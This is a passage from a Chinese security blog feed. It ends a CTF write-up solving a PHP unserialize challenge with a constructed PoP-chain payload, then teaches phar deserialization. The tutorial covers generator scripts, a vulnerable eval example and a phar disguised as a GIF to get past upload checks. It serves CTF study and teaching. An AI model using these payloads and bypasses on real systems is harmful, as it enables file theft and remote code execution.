id="4-pklovecloud"><a href="#4-pklovecloud" class="headerlink" title="4.pklovecloud"></a>4.pklovecloud</h2><p>这道题进去后源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析源码，很明显是一个反序列化，反序列化的题一般都是从终点开始往上倒推，这道题的终点是<code>return file_get_contents($file)</code>，然后<code>$file</code>这个文件存在就行，很明显应该给它赋值为<code>flag.php</code>，然后要满足<code>$this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova</code>就行，那么就需要让<code>neutron</code>的值和<code>nova</code>的值相等就行，然后再往上看它会将<code>$this-&gt;docker</code>反序列化，那么就应该先把<code>acp</code>类的对象序列化之后赋值给<code>this -&gt; docker</code>，而让这个对象中的<code>neutron</code>属性和<code>nova</code>属性值相等，那我们就先构造这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ace();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>它的输出值为<code>O%3A3%3A%22ace%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BN%3Bs%3A4%3A%22nova%22%3Bs%3A1%3A%221%22%3Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%221%22%3B%7D</code></p><p>然后把它赋值给<code>docker</code>属性，再往上看<code>acp</code>类中的<code>__toString()</code>会调用<code>echo_name()</code>，然后我们让它调用的是<code>ace</code>类中的<code>echo_name()</code>就行了，构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> ace();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;flag.php&#x27;</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span> = <span class="string">&#x27;O%3A3%3A%22ace%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BN%3Bs%3A4%3A%22nova%22%3Bs%3A1%3A%221%22%3Bs%3A7%3A%22neutron%22%3Bs%3A1%3A%221%22%3B%7D&#x27;</span>; </span><br><span class="line">   &#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> acp();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出值为：<code>O%3A3%3A%22acp%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00cinder%22%3BO%3A3%3A%22ace%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A9%3A%22openstack%22%3BN%3Bs%3A6%3A%22docker%22%3Bs%3A147%3A%22O%253A3%253A%2522ace%2522%253A3%253A%257Bs%253A9%253A%2522%2500%252A%2500cinder%2522%253BN%253Bs%253A4%253A%2522nova%2522%253Bs%253A1%253A%25221%2522%253Bs%253A7%253A%2522neutron%2522%253Bs%253A1%253A%25221%2522%253B%257D%22%3B%7Ds%3A7%3A%22neutron%22%3BN%3Bs%3A4%3A%22nova%22%3BN%3B%7D</code></p><p>直接去打就行了：</p><p><img src="https://i.loli.net/2021/09/17/BXyJIDFWgHwzNuk.png" alt="image.png"></p><p>这样就出来了，终于出现了这个<code>$heat</code>，从头到尾我都不知道它是干啥的，迷惑人的东西</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还有一道sql注入是利用虚表登录上去，那道题我是真不会，太难了，过滤也很恶心，完全是骚操作哈哈哈，等会了再来总结，总体来看这次第五空间的比赛web题出的不算太难，但考点还是挺有趣的，也有一些新的骚操作，害我还是太菜了，争取下次比赛能多出几个题</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2021第五空间线上赛-部分Web&quot;&gt;&lt;a href=&quot;#2021第五空间线上赛-部分Web&quot; class=&quot;headerlink&quot; title=&quot;2021第五空间线上赛(部分Web)&quot;&gt;&lt;/a&gt;2021第五空间线上赛(部分Web)&lt;/h1&gt;&lt;p&gt;昨天打了第五空间的比赛，虽然说环境是真的垃圾，居然还用的是静态靶机，一堆人在里面乱搞导致题目老是出问题；不过我觉得这次web题的质量还是不错的，难度比较合适，也能从中学到一些东西&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>反序列化篇之phar反序列化</title>
    <link href="https://arsenetang.github.io/2021/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2021/09/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8Bphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-09-04T16:00:00.000Z</published>
    <updated>2021-09-05T11:34:43.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><p>曾经我对于phar的印象，也就是知道好像有个<code>phar://</code>的伪协议，可以将任意后缀名的压缩包解包，从而可以通过上传压缩包绕过对后缀名的限制，再利用伪协议实现文件包含；后来我才知道，利用phar文件包还可以发起反序列化，使PHP反序列化漏洞的利用面更宽广了</p><span id="more"></span><h2 id="1-phar文件结构"><a href="#1-phar文件结构" class="headerlink" title="1.phar文件结构"></a>1.phar文件结构</h2><p>phar是啥？简单的说<code>phar</code>就是<code>php</code>的压缩文件，多个<code>php</code>代码文件和其他资源可以压缩进一个<code>phar</code>文件中，而且不用经过解压就可以被<code>php</code>直接访问，这里是利用<code>phar://</code>伪协议去打开压缩文件的，和<code>jar</code>很像，<code>phar</code>是一种打包文件；之所以会出现<code>phar</code>反序列化漏洞是因为<code>phar</code>文件是以序列化的形式存储用户自定义的<code>meta-data</code>，而当它以流的形式打开的时候，会自动反序列化，相当于也可以在没有<code>unserialize()</code>函数的情况下自动实现反序列化，这个我们后面再慢慢讲，一个<code>phar</code>文件是由四部分组成的：</p><p>1.<code>stub</code>：可以理解为是<code>phar</code>文件的标志，就像<code>GIF89a</code>是图片头一样，它的格式为：<code>xxxxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容没有限制，什么都行，只是结尾必须是<code>__HALT_COMPILER();?&gt;</code>，否则将不能被识别为<code>phar</code>文件</p><p>2.<code>manifest describing the contents</code>：这里存放着压缩文件的信息，每个被压缩文件的权限，属性等信息都放在这里，这里还会以序列化的形式存储着用户自定义的<code>meta-data</code>，这里是<code>phar</code>反序列化攻击最核心的地方，因为这儿是我们可控的，我们就可以将够我们精心构造好的<code>exp</code>放在这里</p><p>3.<code>the file contents</code>：被压缩文件的内容，这个随便是啥都不影响</p><p>4.<code>signature for verifying Phar integrity</code>：签名，放在文件末尾</p><p>其实这四条只有前面两条比较重要，后两条都是来打酱油的，总结下来就是两点：一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容是没有限制的，也就是说我们可以构造一个图片文件或者pdf文件来绕过上传的限制，将这个<code>phar</code>文件上传上去；二是<code>phar</code>文件存储<code>meta-data</code>时会先将内容序列化后再存入进去，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会先将数据反序列化，这样就可以构成反序列化攻击，而文件操作函数有很多，下面就讲它</p><h2 id="2-文件操作函数"><a href="#2-文件操作函数" class="headerlink" title="2.文件操作函数"></a>2.文件操作函数</h2><p>文件操作函数就是<code>php</code>中拿来操作文件的函数，比如说像<code>file_get_contents()</code>和<code>file_put_contents()</code>函数这样用来读写文件的函数，常见的文件操作函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fileatime filectime file_exists file_get_contents file_put_contents file filegroup fopen </span><br><span class="line">fileinode filemtime fileowner fileperms is_dir is_executable is_file is_link is_readable </span><br><span class="line">is_writable is_writeable parse_ini_file copy unlink start readfile </span><br></pre></td></tr></table></figure><p>可能会有漏掉的</p><h2 id="3-phar文件生成测试"><a href="#3-phar文件生成测试" class="headerlink" title="3.phar文件生成测试"></a>3.phar文件生成测试</h2><p>讲了这么久的<code>phar</code>文件，可它到底长什么样儿呢？我们还没形象的见过呢，接下来我们就来生成一个<code>phar</code>文件，看看它到底长啥样， 注意这里需要先将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>Off</code>，并且删掉前面的分号，然后记得重启一下<code>phpstudy</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;ArseneTang&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);  <span class="comment">//生成一个phar文件，名字为phar.phar</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering(); <span class="comment">//下面细讲</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub头</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>); <span class="comment">//将创建的对象a写入到Metadata中</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;testaaa&quot;</span>); <span class="comment">//添加要进行压缩的文件，文件名为test，文件内容为testaaa</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();<span class="comment">//下面细讲</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们先来看看<code>startBuffering()</code>和<code>stopBuffering()</code>是干啥的，看看<code>php</code>手册就行，其实我们只需要知道在创建<code>Phar</code>文件前记得先<code>startBuffering</code>，在写入结束之后记得<code>stopBuffering</code>停止缓冲就行</p><p><img src="https://i.loli.net/2021/09/05/7AUDzymSdp2au5v.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/05/MVFkGSI6PxstwdD.png" alt="image.png"></p><p>好了，然后我们运行上面那段代码就可以生成<code>phar</code>文件了：</p><p><img src="https://i.loli.net/2021/09/05/sL3Kry586YajwnR.png" alt="image.png"></p><p>发现成功生成了，接下来看看它长啥样，发现我们写入的<code>meta-data</code>确实是以序列化的形式存储的：</p><p><img src="https://i.loli.net/2021/09/05/tIaUJbBhCwq3POy.png" alt="image.png"></p><p>而我们前面说过，当<code>php</code>的<strong>文件操作函数</strong>通过<code>phar://</code>伪协议解析<code>phar</code>文件时会先自动先将<code>meta-data</code>进行反序列化，这里就不难理解为什么不需要<code>unserialize()</code>就可以发起反序列化攻击了，因为它是自动反序列化的嘛</p><h2 id="4-简单例题测试"><a href="#4-简单例题测试" class="headerlink" title="4.简单例题测试"></a>4.简单例题测试</h2><p>接下来我们就简单的用一个例题来测试下，首先是存在漏洞的代码<code>test1.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们就来生成<code>phar</code>文件，运行下面的代码，生成<code>a.phar</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;aaatest&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们本来应该把这个<code>phar</code>文件上传上去然后再用<code>phar://</code>伪协议去解析它，这里因为是本地测试，我们就不搞那么麻烦了，我们直接把生成的<code>phar</code>文件放到<code>test1.php</code>的目录下，然后直接用相对路径就行，<code>phar://a.phar/test.txt</code></p><p><img src="https://i.loli.net/2021/09/05/kwnfbxJgY6ytszc.png" alt="image.png"></p><p>但在实际的利用中，我们是需要把文件上传上去的，而存在文件上传的地方一般都会有限制，可能是白名单过滤并且会检测该文件是不是图片文件，如果遇到这种情况我们就可以伪造一个<code>GIF89a</code>的文件头，并且把后缀改成jpg来绕过过滤，因为<code>phar://</code>可以解析任意后缀名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;b.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;aaatest&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就这样生成，生成的<code>b.phar</code>就是一个图片文件了，再把后缀改成jpg就行了：</p><p><img src="https://i.loli.net/2021/09/05/shn42iDlStuyC7b.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/09/05/hjRJW9LSrYcay6d.png" alt="image.png"></p><p>没有问题，成功解析</p><h2 id="5-SWPUCTF-2018-SimplePHP"><a href="#5-SWPUCTF-2018-SimplePHP" class="headerlink" title="5.SWPUCTF 2018 SimplePHP"></a>5.SWPUCTF 2018 SimplePHP</h2><p>这次选择的例题是<code>SWPUCTF</code>2018年的<code>SimplePHP</code>，我觉得这题是真的出的好，既考了pop链也考了<code>phar</code>反序列化，难度也很合适，题目可以在<code>buuctf</code>上面复现</p><p>进去之后有个查看文件的功能和上传文件的功能，我们先点击查看文件的功能把里面的文件看看，一些比较重要的文件如下：</p><p>function.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line">header(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        unlink(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123; </span><br><span class="line">        upload_file_do(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = end(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> 